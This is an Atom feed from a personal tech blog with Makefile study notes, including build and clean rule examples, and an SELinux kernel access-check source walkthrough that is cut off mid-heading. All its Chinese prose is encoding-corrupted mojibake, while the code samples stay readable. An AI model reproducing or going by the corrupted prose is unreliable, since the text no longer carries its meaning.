<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é£ä¹‹æ –æ¯åœ°</title>
  
  <subtitle>habitat of wind</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hurricane618.me/"/>
  <updated>2023-06-16T16:35:51.365Z</updated>
  <id>https://hurricane618.me/</id>
  
  <author>
    <name>hurricane618</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Makefileå­¦ä¹ ç¬”è®°</title>
    <link href="https://hurricane618.me/2023/06/17/makefile-study-notes/"/>
    <id>https://hurricane618.me/2023/06/17/makefile-study-notes/</id>
    <published>2023-06-16T16:35:51.000Z</published>
    <updated>2023-06-16T16:35:51.365Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ç¯‡å­¦ä¹ ç¬”è®°æ˜¯æ ¹æ®é™ˆæµ©å†™çš„ã€Šè·Ÿæˆ‘ä¸€èµ·å†™Makefileã€‹ç³»åˆ—æ–‡ç« æ€»ç»“å‡ºçš„å†…å®¹ï¼Œè¿™ä¸ªç³»åˆ—æ–‡ç« å¯¹Makefileçš„è®²è§£æ·±å…¥æµ…å‡ºï¼Œå¯¹äºæ–°äººååˆ†å‹å¥½ã€‚æ¨èå¤§å®¶åœ¨æœ‰æ—¶é—´çš„æƒ…å†µä¸‹ï¼Œé€šè¯»å…¨æ–‡ã€‚</p><p>åœ¨å†™æ–‡ç« åˆ°ä¸€åŠçš„æ—¶å€™ï¼ŒæƒŠé—»é™ˆæµ©è€å¸ˆç¦»ä¸–ï¼Œä¸­æ–‡äº’è”ç½‘æ°¸è¿œå¤±å»äº†ä¸€ä½å……æ»¡ç†æƒ³çš„æŠ€æœ¯äººï¼Œå†™è¿™ç¯‡æ–‡ç« ä¹Ÿæ˜¯æ„Ÿè°¢é™ˆæµ©è€å¸ˆä¸ºæˆ‘ä»¬è´¡çŒ®äº†å¦‚æ­¤ä¹‹å¤šçš„å¥½åšæ–‡ï¼Œæ‚¨æ°¸è¿œéƒ½æ˜¯æˆ‘çš„æ¦œæ ·ã€‚å¸Œæœ›ä¸­å›½çš„ç¨‹åºå‘˜ä¸è¦é‚£ä¹ˆçš„è‹¦é€¼ï¼Œä¸æ˜¯æ¯å¤©996ï¼Œè€Œæ˜¯çœŸæ­£çš„åœ¨æ¢ç´¢æŠ€æœ¯ï¼Œåˆ©ç”¨æŠ€æœ¯æ¥æå‡è‡ªå·±çš„ç”Ÿäº§åŠ›ã€‚</p><p>è¿™æ˜¯ç¬¬ä¸€æ¬¡æ„Ÿå—åˆ°ç¨‹åºå‘˜èº«ä½“å¥åº·çš„é‡è¦æ€§ï¼Œä¹Ÿå¸Œæœ›å¹¿å¤§ç¨‹åºå‘˜æœ‹å‹ç§¯æé”»ç‚¼èº«ä½“ï¼Œèº«ä½“æ‰æ˜¯é©å‘½çš„æœ¬é’±ã€‚</p><h2 id="Makefileæ€ç»´å¯¼å›¾"><a href="#Makefileæ€ç»´å¯¼å›¾" class="headerlink" title="Makefileæ€ç»´å¯¼å›¾"></a>Makefileæ€ç»´å¯¼å›¾</h2><img src="/2023/06/17/makefile-study-notes/Makefile.png"><h2 id="ä¸€äº›æœ‰ç”¨çš„ä¾‹å­"><a href="#ä¸€äº›æœ‰ç”¨çš„ä¾‹å­" class="headerlink" title="ä¸€äº›æœ‰ç”¨çš„ä¾‹å­"></a>ä¸€äº›æœ‰ç”¨çš„ä¾‹å­</h2><h3 id="å°†æ‰€æœ‰-cæ–‡ä»¶ç¼–è¯‘ä¸ºç›®æ ‡foo"><a href="#å°†æ‰€æœ‰-cæ–‡ä»¶ç¼–è¯‘ä¸ºç›®æ ‡foo" class="headerlink" title="å°†æ‰€æœ‰.cæ–‡ä»¶ç¼–è¯‘ä¸ºç›®æ ‡foo"></a>å°†æ‰€æœ‰.cæ–‡ä»¶ç¼–è¯‘ä¸ºç›®æ ‡foo</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objects := <span class="variable">$(<span class="built_in">patsubst</span> %.c,%.o,$(<span class="built_in">wildcard</span> *.c)</span>)</span><br><span class="line">foo : <span class="variable">$(objects)</span></span><br><span class="line">    cc -o foo <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>$(wildcard *.c)</code>æ‰¾åˆ°æ‰€æœ‰çš„<code>.c</code>æ–‡ä»¶ï¼Œé€šè¿‡<code>$(patsubst %.c,%.o,$(wildcard *.c))</code>å°†æ‰€æœ‰<code>.c</code>æ–‡ä»¶æ›¿æ¢ä¸º<code>.o</code>æ–‡ä»¶å½“åšobjectå˜é‡çš„å€¼ã€‚æœ€åçš„ä¾èµ–è§„åˆ™ä¸­æˆä¸ºfooç›®æ ‡çš„ä¾èµ–é¡¹ï¼Œå…¶ä¸­çš„<code>.o</code>ä¼šè¢«è‡ªåŠ¨æ¨å¯¼ä¸ºå¯¹åº”<code>.c</code>æ–‡ä»¶çš„ç¼–è¯‘ç”Ÿæˆå†…å®¹ã€‚</p><h3 id="ç”Ÿæˆå¤šä¸ªç›®æ ‡æ–‡ä»¶"><a href="#ç”Ÿæˆå¤šä¸ªç›®æ ‡æ–‡ä»¶" class="headerlink" title="ç”Ÿæˆå¤šä¸ªç›®æ ‡æ–‡ä»¶"></a>ç”Ÿæˆå¤šä¸ªç›®æ ‡æ–‡ä»¶</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">all : prog1 prog2 prog3</span><br><span class="line">.PHONY : all</span><br><span class="line"></span><br><span class="line">prog1 : prog1.o utils.o</span><br><span class="line">    cc -o prog1 prog1.o utils.o</span><br><span class="line">prog2 : prog2.o</span><br><span class="line">    cc -o prog2 prog2.o</span><br><span class="line">prog3 : prog3.o sort.o utils.o</span><br><span class="line">    cc -o prog3 prog3.o sort.o utils.o</span><br></pre></td></tr></table></figure><p>allä¾èµ–3ä¸ªprogï¼Œè¿™æ ·å°±èƒ½å…¨éƒ¨æ‰§è¡Œå¯¹åº”çš„ç”Ÿæˆå‘½ä»¤ï¼Œæœ€åå¾—åˆ°3ä¸ªç›®æ ‡æ–‡ä»¶ã€‚</p><h3 id="æ¸…ç†ä¸åŒç±»å‹æ–‡ä»¶"><a href="#æ¸…ç†ä¸åŒç±»å‹æ–‡ä»¶" class="headerlink" title="æ¸…ç†ä¸åŒç±»å‹æ–‡ä»¶"></a>æ¸…ç†ä¸åŒç±»å‹æ–‡ä»¶</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : cleanall cleanobj cleandiff</span><br><span class="line"></span><br><span class="line">cleanall : cleanobj cleandiff</span><br><span class="line">    rm program</span><br><span class="line">cleanobj :</span><br><span class="line">    rm *.o</span><br><span class="line">cleandiff :</span><br><span class="line">    rm *.diff</span><br></pre></td></tr></table></figure><p>å®šä¹‰äº†3ä¸ªä¼ªç›®æ ‡ï¼Œè¿™æ ·èƒ½é€šè¿‡<code>make cleanall</code>æ¸…é™¤æ‰€æœ‰ç›®æ ‡ï¼Œ<code>make cleanobj</code>æ¸…é™¤<code>.o</code>æ–‡ä»¶ï¼Œ<code>make cleandiff</code>æ¸…é™¤<code>.diff</code>æ–‡ä»¶ã€‚</p><h3 id="å°†å¤šä¸ªå­˜åœ¨ç”Ÿæˆè§„å¾‹çš„ç›®æ ‡æ•´åˆæˆä¸€æ¡è§„åˆ™"><a href="#å°†å¤šä¸ªå­˜åœ¨ç”Ÿæˆè§„å¾‹çš„ç›®æ ‡æ•´åˆæˆä¸€æ¡è§„åˆ™" class="headerlink" title="å°†å¤šä¸ªå­˜åœ¨ç”Ÿæˆè§„å¾‹çš„ç›®æ ‡æ•´åˆæˆä¸€æ¡è§„åˆ™"></a>å°†å¤šä¸ªå­˜åœ¨ç”Ÿæˆè§„å¾‹çš„ç›®æ ‡æ•´åˆæˆä¸€æ¡è§„åˆ™</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bigoutput littleoutput : text.g</span><br><span class="line">    generate text.g -<span class="variable">$(<span class="built_in">subst</span> output,,<span class="variable">$@</span>)</span> &gt; <span class="variable">$@</span></span><br><span class="line"><span class="comment"># ä¸Šè¿°è§„åˆ™ç­‰ä»·äº</span></span><br><span class="line">bigoutput : text.g</span><br><span class="line">    generate text.g -big &gt; bigoutput</span><br><span class="line">littleoutput : text.g</span><br><span class="line">    generate text.g -little &gt; littleoutput</span><br></pre></td></tr></table></figure><p><code>$@</code>è¡¨ç¤ºç›®æ ‡çš„é›†åˆï¼Œä¼šä¾æ¬¡ä»ä¸­å–å‡ºç›®æ ‡ç”¨äºæ‰§è¡Œå‘½ä»¤ï¼Œä¹‹ååˆä½¿ç”¨<code>$(subst output,,$@)</code>å°†outputæ›¿æ¢æˆç©ºã€‚</p><h3 id="åˆ©ç”¨é™æ€æ¨¡å¼è§„åˆ™å®ç°æ‰¹é‡ä¾èµ–è§„åˆ™"><a href="#åˆ©ç”¨é™æ€æ¨¡å¼è§„åˆ™å®ç°æ‰¹é‡ä¾èµ–è§„åˆ™" class="headerlink" title="åˆ©ç”¨é™æ€æ¨¡å¼è§„åˆ™å®ç°æ‰¹é‡ä¾èµ–è§„åˆ™"></a>åˆ©ç”¨é™æ€æ¨¡å¼è§„åˆ™å®ç°æ‰¹é‡ä¾èµ–è§„åˆ™</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">files = foo.elc bar.o lose.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">filter</span> %.o,<span class="variable">$(files)</span>)</span>: %.o: %.c</span><br><span class="line">    <span class="variable">$(CC)</span> -c <span class="variable">$(CFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="variable">$(<span class="built_in">filter</span> %.elc,<span class="variable">$(files)</span>)</span>: %.elc: %.el</span><br><span class="line">    emacs -f batch-byte-compile <span class="variable">$&lt;</span></span><br></pre></td></tr></table></figure><p><code>$(filter %.o,$(files))</code>ä»fileså˜é‡ä¸­ç­›é€‰å‡º<code>.o</code>æ–‡ä»¶ï¼Œè¿™äº›<code>.o</code>æ–‡ä»¶å…¨éƒ¨åŒ¹é…ä¸Š<code>.c</code>æ–‡ä»¶ã€‚å¯¹åº”çš„æ‰§è¡Œè§„åˆ™<code>$&lt;</code>åœ¨æ¨¡å¼åŒ¹é…ä¸­ä¼šè¡¨ç¤ºä¸€ç»„ä¾èµ–æ–‡ä»¶é›†ï¼Œå’Œ<code>$@</code>ç»„åˆåœ¨ä¸€èµ·åˆšå¥½æ˜¯å¯¹æ‰€æœ‰ç¬¦åˆçš„<code>.c</code>æ–‡ä»¶ç”Ÿæˆå¯¹åº”<code>.o</code>æ–‡ä»¶ã€‚</p><h3 id="è‡ªåŠ¨æ›´æ–°Makefileä¸­çš„ä¾èµ–å…³ç³»"><a href="#è‡ªåŠ¨æ›´æ–°Makefileä¸­çš„ä¾èµ–å…³ç³»" class="headerlink" title="è‡ªåŠ¨æ›´æ–°Makefileä¸­çš„ä¾èµ–å…³ç³»"></a>è‡ªåŠ¨æ›´æ–°Makefileä¸­çš„ä¾èµ–å…³ç³»</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">%.d: %.c</span></span><br><span class="line">    @set -e; rm -f <span class="variable">$@</span>; \</span><br><span class="line">    <span class="variable">$(CC)</span> -M <span class="variable">$(CPPFLAGS)</span> <span class="variable">$&lt;</span> &gt; <span class="variable">$@</span>.$$$$; \</span><br><span class="line">    sed 's,\(<span class="variable">$*</span>\)\.o[ :]*,\1.o <span class="variable">$@</span> : ,g' &lt; <span class="variable">$@</span>.$$$$ &gt; <span class="variable">$@</span>; \</span><br><span class="line">    rm -f <span class="variable">$@</span>.$$$$</span><br><span class="line">   </span><br><span class="line"><span class="keyword">include</span> $(sources:.c=.d)</span><br></pre></td></tr></table></figure><p>å°†æ‰€æœ‰çš„<code>.d</code>æ–‡ä»¶ä¾èµ–äº<code>.c</code>æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬çš„cæ–‡ä»¶æ›´æ–°æ—¶ä¼šè‡ªåŠ¨æ›´æ–°<code>.d</code>ä¾èµ–æ–‡ä»¶ã€‚é¦–å…ˆä¼šåˆ é™¤åŸæœ‰çš„ä¾èµ–æ–‡ä»¶ï¼Œä¹‹ååˆ™æ˜¯ç”Ÿæˆæ–°çš„ä¾èµ–æ–‡ä»¶ã€‚<code>$$$$</code> æ„ä¸ºä¸€ä¸ªéšæœºç¼–å·ï¼Œç”Ÿæˆçš„æ–‡ä»¶åä¼šæ‹¼æ¥ä¸Šè¿™ä¸ªéšæœºç¬¦å·ï¼Œè¿™é‡Œçš„åç§°å¯èƒ½æ˜¯<code>name.d.12345</code>ã€‚ç¬¬ä¸‰è¡Œçš„sedæ˜¯å°†å…¶ä¸­çš„ä¾èµ–å…³ç³»åŠ å…¥<code>xxx.d</code>æ–‡ä»¶ï¼Œç¬¬å››è¡Œåˆ™æ˜¯åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚å¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨è¿™ä¸ªä¾èµ–å…³ç³»ï¼Œå¯ä»¥ç›´æ¥ç”¨includeæ‰¹é‡å¼•å…¥ã€‚</p><h3 id="åµŒå¥—æ‰§è¡ŒMakefile"><a href="#åµŒå¥—æ‰§è¡ŒMakefile" class="headerlink" title="åµŒå¥—æ‰§è¡ŒMakefile"></a>åµŒå¥—æ‰§è¡ŒMakefile</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">subsystem:</span></span><br><span class="line">    cd subdir &amp;&amp; <span class="variable">$(MAKE)</span></span><br><span class="line"></span><br><span class="line"><span class="section">subsystem:</span></span><br><span class="line">    cd subdir; <span class="variable">$(MAKE)</span></span><br><span class="line">    </span><br><span class="line"><span class="section">subsystem:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C subdir</span><br></pre></td></tr></table></figure><p>ç”±ä¸€ä¸ªä¸»Makefileå¼€å§‹ï¼Œå»æ‰§è¡Œå­ç›®å½•ä¸­çš„Makefileï¼Œè¿™æ ·çš„ç»“æ„èƒ½æœ‰æ•ˆå‡å°‘Makefileçš„å¤æ‚åº¦ã€‚</p><h3 id="ä½¿ç”¨MAKELEVELå¯¹ä¸åŒçš„è°ƒç”¨å±‚ä½œåŒºåˆ†"><a href="#ä½¿ç”¨MAKELEVELå¯¹ä¸åŒçš„è°ƒç”¨å±‚ä½œåŒºåˆ†" class="headerlink" title="ä½¿ç”¨MAKELEVELå¯¹ä¸åŒçš„è°ƒç”¨å±‚ä½œåŒºåˆ†"></a>ä½¿ç”¨MAKELEVELå¯¹ä¸åŒçš„è°ƒç”¨å±‚ä½œåŒºåˆ†</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ifeq</span> (0,$&#123;MAKELEVEL&#125;)</span><br><span class="line">cur-dir := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">whoami := <span class="variable">$(<span class="built_in">shell</span> whoami)</span></span><br><span class="line">host-type := <span class="variable">$(<span class="built_in">shell</span> arch)</span></span><br><span class="line">MAKE := $&#123;MAKE&#125; host-type=$&#123;host-type&#125; whoami=$&#123;whoami&#125;</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿå˜é‡<code>MAKELEVEL</code>è®°å½•äº†å½“å‰çš„Makefileçš„è°ƒç”¨å±‚æ•°ï¼ŒåµŒå¥—è°ƒç”¨çš„æ—¶å€™è¿™ä¸ªå˜é‡æ•°å€¼ä¼šå¢åŠ ã€‚</p><h3 id="åˆ©ç”¨VPATHæœç´¢è·¯å¾„æŒ‡å®šä¾èµ–æ–‡ä»¶çš„æœç´¢è·¯å¾„"><a href="#åˆ©ç”¨VPATHæœç´¢è·¯å¾„æŒ‡å®šä¾èµ–æ–‡ä»¶çš„æœç´¢è·¯å¾„" class="headerlink" title="åˆ©ç”¨VPATHæœç´¢è·¯å¾„æŒ‡å®šä¾èµ–æ–‡ä»¶çš„æœç´¢è·¯å¾„"></a>åˆ©ç”¨VPATHæœç´¢è·¯å¾„æŒ‡å®šä¾èµ–æ–‡ä»¶çš„æœç´¢è·¯å¾„</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> CFLAGS += <span class="variable">$(<span class="built_in">patsubst</span> %,-I%,$(<span class="built_in">subst</span> :, ,<span class="variable">$(VPATH)</span>)</span>)</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>$(VPATH)</code>çš„å€¼ä¸º<code>src:../headers</code>ï¼Œé‚£ä¹ˆä¸Šé¢çš„è¯­å¥å°†ä¼šè¿”å›<code>-Isrc -I../headers</code>ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™ç¯‡å­¦ä¹ ç¬”è®°æ˜¯æ ¹æ®é™ˆæµ©å†™çš„ã€Šè·Ÿæˆ‘ä¸€èµ·å†™Makefileã€‹ç³»åˆ—æ–‡ç« æ€»ç»“å‡ºçš„å†…å®¹ï¼Œè¿™ä¸ªç³»åˆ—æ–‡ç« å¯¹Makefileçš„è®²è§£æ·±å…¥æµ…å‡ºï¼Œå¯¹äºæ–°äººååˆ†å‹å¥½
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="makefile" scheme="https://hurricane618.me/tags/makefile/"/>
    
  </entry>
  
  <entry>
    <title>SELinuxæºç åˆ†æ--å†…æ ¸æ€</title>
    <link href="https://hurricane618.me/2023/03/14/selinux-source-code-kernel-part/"/>
    <id>https://hurricane618.me/2023/03/14/selinux-source-code-kernel-part/</id>
    <published>2023-03-14T15:56:59.000Z</published>
    <updated>2023-03-14T15:56:59.339Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸ºäº†æ›´åŠ ç†Ÿæ‚‰SELinuxï¼Œé’ˆå¯¹è¿™ä¸ªå®‰å…¨æœºåˆ¶çš„æºç éƒ¨åˆ†åšäº†ä¸€äº›æ¢³ç†ï¼Œç»“åˆäº†å®˜æ–¹çš„æŒ‡å—ä¸°å¯Œäº†å…¶ä¸­çš„æºç å®ç°ç»†èŠ‚ã€‚SELinuxåšå¤§ç²¾æ·±ï¼Œè¿™ç¯‡è®²è¿°è¯¥æœºåˆ¶çš„å†…æ ¸éƒ¨åˆ†å®ç°ï¼ŒåŒ…æ‹¬è´¯ç©¿æ•´ä¸ªæœºåˆ¶çš„ä¸¤ä¸ªæ ¸å¿ƒâ€”â€”å¯¹ç³»ç»Ÿè¡Œä¸ºçš„æ£€æŸ¥ä»¥åŠæ ‡ç­¾çš„è½¬æ¢ï¼Œä»¥åŠæ¯”è¾ƒæ ¸å¿ƒçš„æ•°æ®å’Œæ¥å£ã€‚</p><p>å¤‡æ³¨ï¼šæˆ‘çš„æºç åˆ†æä¸­å¿½ç•¥äº†mlsæœºåˆ¶ï¼Œåœ¨ä¸€äº›æ£€æŸ¥ç‚¹ä¸­é’ˆå¯¹mlsæœ‰é¢å¤–çš„å¤„ç†ã€‚</p><h2 id="æ ¸å¿ƒæµç¨‹ä¸€ï¼šå¯¹ç³»ç»Ÿè°ƒç”¨è¡Œä¸ºçš„é‰´æƒ"><a href="#æ ¸å¿ƒæµç¨‹ä¸€ï¼šå¯¹ç³»ç»Ÿè°ƒç”¨è¡Œä¸ºçš„é‰´æƒ" class="headerlink" title="æ ¸å¿ƒæµç¨‹ä¸€ï¼šå¯¹ç³»ç»Ÿè°ƒç”¨è¡Œä¸ºçš„é‰´æƒ"></a>æ ¸å¿ƒæµç¨‹ä¸€ï¼šå¯¹ç³»ç»Ÿè°ƒç”¨è¡Œä¸ºçš„é‰´æƒ</h2><p>æˆ‘è¿™é‡Œæ‹¿<code>fork</code>ç³»ç»Ÿè°ƒç”¨ä¸ºä¾‹å­ğŸŒ°ï¼Œæ•´ä¸ªè°ƒç”¨è¿‡ç¨‹æ ¸å¿ƒæµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><img src="/2023/03/14/selinux-source-code-kernel-part/selinuxè¡Œä¸ºé‰´æƒ.png"><p>é¦–å…ˆæ˜¯ç³»ç»Ÿè°ƒç”¨çš„å…¥å£å‡½æ•°é‡Œä¼šå­˜åœ¨ä¸€äº›hookç‚¹ï¼Œæ¯”å¦‚è¿™é‡Œçš„forkç³»ç»Ÿè°ƒç”¨åœ¨<code>copy_process</code>ä¸­å­˜åœ¨<code>security_task_alloc</code>ï¼Œè€Œè¿™ä¸ªæ˜¯LSMçš„hookç‚¹ä½ã€‚SELinuxçš„<code>hooks.c</code>ä¸­<code>selinux_hooks</code>ç»“æ„ä½“æ•°ç»„å°†SELinuxç›¸å…³çš„æ£€æŸ¥å‡½æ•°ç”¨<code>LSM_HOOK_INIT</code>è®¾ç½®åˆ°å¯¹åº”çš„hookç‚¹ä¸Šã€‚</p><p>åœ¨æŸä¸ªè¿›ç¨‹è§¦å‘forkç³»ç»Ÿè°ƒç”¨ï¼Œåˆ°è¾¾å®‰å…¨æ£€æµ‹ç‚¹ä¼šè·³è½¬åˆ°<code>selinux_task_alloc</code>å‡½æ•°ã€‚è¯¥å‡½æ•°åˆ™æ˜¯SELinuxæ£€æµ‹è¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯å¦æœ‰æƒé™æ‰§è¡Œã€‚ä¸åŒçš„ç³»ç»Ÿè°ƒç”¨æœ‰ä¸åŒçš„æ£€æŸ¥é€»è¾‘ï¼Œæœ€ç»ˆä¼šè°ƒç”¨çš„æƒé™æ£€æŸ¥å‡½æ•°ä¹Ÿæœ‰æ‰€ä¸åŒï¼Œ<code>fork</code>ç³»ç»Ÿè°ƒç”¨çš„æ£€æŸ¥å‡½æ•°æ˜¯<code>avc_has_perm</code>ã€‚</p><p><code>avc_has_perm</code>å‡½æ•°åœ¨<code>avc.c</code>ä¸­ï¼Œç”¨äºæ£€æŸ¥ç³»ç»Ÿè°ƒç”¨æ˜¯å¦è¢«æˆæƒã€‚å…¶ä¸­æœ‰ä¸¤ä¸ªä¸»è¦å‡½æ•°åˆ†åˆ«ä¸º<code>avc_has_perm_noaudit</code>å’Œ<code>avc_audit</code>ï¼Œ<code>avc_has_perm_noaudit</code>ä¸»è¦åšå…·ä½“çš„æƒé™æ£€æŸ¥ï¼Œè€Œ<code>avc_audit</code>åˆ™æ˜¯è®°å½•avcæ—¥å¿—ä¿¡æ¯ã€‚</p><p><code>avc_has_perm_noaudit</code>é¦–å…ˆç»™è‡ªå·±åŠ ä¸Šrcuçš„è¯»é”ï¼Œç„¶åä»å·²æœ‰çš„avcæ•°æ®ä¸­æŸ¥æ‰¾æ˜¯å¦ç¼“å­˜è¿‡ï¼Œæ‰¾å¾—åˆ°å°±ç›´æ¥å¤åˆ¶ä¸€ä»½å‡ºæ¥ï¼Œæ²¡æœ‰æ‰¾åˆ°åˆ™è¿›å…¥<code>avc_compute_av</code>è®¡ç®—avæ•°æ®ã€‚æ ¹æ®avæ•°æ®ä¸­çš„è§„åˆ™æƒé™å’Œè¯·æ±‚çš„æƒé™æ±‚å¾—è¿™æ¬¡è¯·æ±‚æ˜¯å¦è¢«å…è®¸ï¼Œå¦‚æœè¡Œä¸ºä¸å…è®¸ï¼Œä¼šè¿›å…¥<code>avc_denied</code>å°†è¿™æ¬¡çš„avç»“æœæ›´æ–°ã€‚</p><p><code>avc_compute_av</code>ä¸»è¦åŒ…å«ä¸¤ä¸ªå‡½æ•°ï¼Œå…¶ä¸€æ˜¯ <code>security_compute_av</code>ï¼Œè´Ÿè´£è®¡ç®—avæ•°æ®ï¼›å…¶äºŒæ˜¯<code>avc_insert</code>å°†è®¡ç®—åˆ°çš„avcæ•°æ®æ’å…¥ç¼“å­˜ä¸­ã€‚<code>security_compute_av</code>é€šè¿‡<code>ssid</code>å’Œ<code>tsid</code>åœ¨sidtabä¸­æœç´¢åˆ°<code>scontext</code>å’Œ<code>tcontext</code>è¿›å…¥åˆ°æ•´ä¸ªæµç¨‹çš„æ ¸å¿ƒå‡½æ•°<code>context_struct_compute_av</code>ã€‚</p><p><code>context_struct_compute_av</code>å‡½æ•°å«æœ‰å¤šä¸ªæ£€æŸ¥è®¿é—®æ˜¯å¦åˆæ³•çš„æ­¥éª¤ã€‚</p><ol><li>avdå†…å®¹çš„åˆå§‹åŒ–ï¼›</li><li>éå†æ£€æŸ¥å¯¹è±¡ç±»å’Œæƒé™ï¼Œå¹¶æ ¹æ®èŠ‚ç‚¹çš„ç±»å‹ï¼ˆAVTAB_ALLOWEDã€AVTAB_AUDITALLOWã€AVTAB_AUDITDENYã€AVTAB_XPERMSï¼‰å°†æ•°æ®æ•´åˆè¿›avdä¸­ï¼›</li><li><code>cond_compute_av</code>æ£€æŸ¥æ˜¯å¦æœ‰æ¡ä»¶è¯­å¥è§„åˆ™åŒ…å«åœ¨è¿™æ¬¡çš„è®¿é—®åˆ¤æ–­ä¸­ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¼šå¯¹æƒé™åšä¿®æ”¹ï¼›</li><li>é€šè¿‡<code>constraint_expr_eval</code>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨é¢å¤–çº¦æŸï¼Œæ ¹æ®é¢å¤–çº¦æŸç§»é™¤æƒé™ï¼›</li><li>å¦‚æœè¿›ç¨‹æ ‡ç­¾è½¬æ¢æ­£åœ¨æ‰§è¡Œï¼Œéœ€è¦æ£€æµ‹æ˜¯å¦æœ‰<code>transition</code>æˆ–<code>dyntransition</code>æƒé™ï¼Œæ˜¯å¦æœ‰è§’è‰²çš„æ”¹å˜ã€‚</li><li>æ£€æŸ¥æ˜¯å¦æœ‰<code>typebounds</code>è§„åˆ™çº¦æŸåº”ç”¨åœ¨è¿™æ¬¡è®¿é—®ä¸­ï¼Œæ ¹æ®é¢å¤–çº¦æŸä¿®æ­£æƒé™</li><li>è¿™äº›ç»“æœéƒ½ä¿å­˜åœ¨avdæ•°æ®ä¸­</li></ol><p><code>avc_audit</code>ä¼šå…ˆåˆ©ç”¨<code>avc_audit_required</code>æ£€æŸ¥æ˜¯å¦è¦è®°å½•auditæ—¥å¿—ï¼Œå†è°ƒç”¨<code>slow_avc_audit</code>å‡½æ•°æ„é€ å…·ä½“çš„æ—¥å¿—ä¿¡æ¯ã€‚<code>avc_audit_required</code>å†…éƒ¨ä¼šå…ˆæŠŠè¯·æ±‚çš„æƒé™å’Œå–ååçš„å…è®¸æƒé™åšä¸æ“ä½œï¼Œè¿™æ ·å°±èƒ½å¾—åˆ°æ˜¯å¦æ‹’ç»è¯¥è¡Œä¸ºã€‚ä½†è¿™é‡Œä¼šæœ‰å¦å¤–ä¸€ä¸ªä½<code>avd-&gt;auditdeny</code>ï¼Œå¦‚æœè¯¥ä½è¢«ç½®ä¸º0ï¼Œåˆ™è¿™ä¸ªæ‹’ç»è¡Œä¸ºä¸ä¼šè¢«è®°å½•åœ¨auditæ—¥å¿—ä¸­ã€‚</p><p>å½“æ•´ä¸ªé‰´æƒè¿‡ç¨‹ç»“æŸä¹‹åä¼šä»<code>selinux_task_alloc</code>è¿”å›ï¼Œä¸€è·¯è¿”å›åˆ°forkè‡ªèº«çš„<code>copy_process</code>ä¸­ç»§ç»­ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œã€‚</p><h2 id="æ ¸å¿ƒæµç¨‹äºŒï¼šè¿›ç¨‹çš„æ ‡ç­¾è½¬æ¢"><a href="#æ ¸å¿ƒæµç¨‹äºŒï¼šè¿›ç¨‹çš„æ ‡ç­¾è½¬æ¢" class="headerlink" title="æ ¸å¿ƒæµç¨‹äºŒï¼šè¿›ç¨‹çš„æ ‡ç­¾è½¬æ¢"></a>æ 